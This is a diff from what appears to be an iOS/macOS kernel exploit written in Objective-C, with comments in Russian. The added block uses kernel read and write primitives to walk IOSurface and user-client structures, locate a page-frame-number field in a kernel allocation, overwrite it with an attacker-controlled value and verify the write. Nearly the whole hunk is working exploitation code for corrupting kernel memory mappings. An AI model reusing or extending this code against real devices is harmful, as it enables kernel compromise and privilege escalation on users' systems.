@@ -7126,6 +7126,65 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
                   cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
     }
+    // 1.9.229 (р.56): ПОЛНАЯ ЦЕПЬ ДО SPEC — op-entry ([op+0x48]==UC) →
+    // plane-struct (sel1: op+0x438) → [ps+0x90]=IOSurface → [surf+0x30]=plane-desc
+    // → [desc+0x60]=ranges-spec (kalloc_type 0x64) → +0x58 pfn32 = patch-point.
+    // cmd: [ps+0x98] → [cmd+0x70] mapObj → [+0xa0] DVA. До retry — вооружён.
+    {
+        uint64_t vcO = kpM2TClientVA(r, isTable, victim, @"opc-victim");
+        uint64_t ucO = kpLooksLikeKernelPointer(vcO) ? kp_untag_ptr(early_kread64(vcO + 0x30)) : 0;
+        uint64_t provO = kpLooksLikeKernelPointer(ucO) ? kp_untag_ptr(early_kread64(ucO + 0xe8)) : 0;
+        uint64_t opVA = 0;
+        if (kpLooksLikeKernelPointer(provO) && kpSafeToRead(provO)) {
+            uint64_t arrays[2] = { kp_untag_ptr(early_kread64(provO + 0xc8)), kp_untag_ptr(early_kread64(provO + 0x110)) };
+            uint64_t counts[2] = { early_kread64(provO + 0xb8), early_kread64(provO + 0x100) };
+            for (int ai = 0; ai < 2 && !opVA; ai++) {
+                uint64_t arr = arrays[ai];
+                uint64_t cnt = counts[ai]; if (cnt > 256) cnt = 256;
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                for (uint64_t i = 0; i < cnt && !opVA; i++) {
+                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
+                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucO) { opVA = op; break; }
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [OPC] UC=%#llx prov=%#llx op=%#llx", (unsigned long long)ucO, (unsigned long long)provO, (unsigned long long)opVA]);
+        if (opVA) {
+            uint64_t psArr[2] = { kp_untag_ptr(early_kread64(opVA + 0x438)), kp_untag_ptr(early_kread64(opVA + 0x6f8)) };
+            for (int pi = 0; pi < 2 && !nSpec; pi++) {
+                uint64_t ps = psArr[pi];
+                if (!kpLooksLikeKernelPointer(ps) || !kpSafeToRead(ps)) continue;
+                uint64_t surf2 = kp_untag_ptr(early_kread64(ps + 0x90));
+                uint32_t sid2 = kpLooksLikeKernelPointer(surf2) ? (uint32_t)early_kread64(surf2 + 0x10) : 0;
+                // cmd → DVA для контроля
+                uint64_t cmd2 = kp_untag_ptr(early_kread64(ps + 0x98));
+                uint64_t mapObj2 = (kpLooksLikeKernelPointer(cmd2) && kpSafeToRead(cmd2)) ? kp_untag_ptr(early_kread64(cmd2 + 0x70)) : 0;
+                uint64_t dva2 = 0, len2 = 0;
+                if (kpLooksLikeKernelPointer(mapObj2) && kpSafeToRead(mapObj2)) { dva2 = early_kread64(mapObj2 + 0xa0); len2 = early_kread64(mapObj2 + 0xa8); }
+                kpNote(r, [NSString stringWithFormat:@"  [OPC] ps%d=%#llx surf=%#llx sid=%u cmd=%#llx DVA=%#llx len=%#llx",
+                          pi, (unsigned long long)ps, (unsigned long long)surf2, sid2, (unsigned long long)cmd2, (unsigned long long)dva2, (unsigned long long)len2]);
+                if (sid2 != dstID) continue;
+                uint64_t pd2 = kp_untag_ptr(early_kread64(surf2 + 0x30));
+                uint64_t spec2 = (kpLooksLikeKernelPointer(pd2) && kpSafeToRead(pd2)) ? kp_untag_ptr(early_kread64(pd2 + 0x60)) : 0;
+                if (!kpLooksLikeKernelPointer(spec2) || !kpSafeToRead(spec2)) continue;
+                uint64_t v = early_kread64(spec2 + 0x58);
+                kpNote(r, [NSString stringWithFormat:@"  [OPC] spec=%#llx +0x58=%#018llx (ждём pfn32=%#x)", (unsigned long long)spec2, (unsigned long long)v, pfn32]);
+                if ((uint32_t)v == pfn32) {
+                    uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                    kpNote(r, [NSString stringWithFormat:@"  [OPC] ★ spec+0x58 через op-entry: %#018llx → %#018llx", (unsigned long long)v, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(spec2 + 0x58, nq);
+                    uint64_t rb = early_kread64(spec2 + 0x58);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    specVA[nSpec] = spec2 + 0x58; specOld[nSpec] = v; nSpec++;
+                } else {
+                    for (uint32_t o = 0; o + 8 <= 0x64; o += 8)
+                        kpNote(r, [NSString stringWithFormat:@"    opc-spec+%#x: %#018llx", o, (unsigned long long)early_kread64(spec2 + o)]);
+                }
+            }
+        }
+    }
     // 1.9.224: spec+0x58 ПОСЛЕ execute#1 — пре-execute дамп (1.9.223) показал
     // канарейки и random (+0x00=0): спек ЗАПОЛНЯЕТСЯ фабрикой при первом execute,
     // а не при create/submit. Патчить надо ТУТ (pfn уже на месте) — retry возьмёт
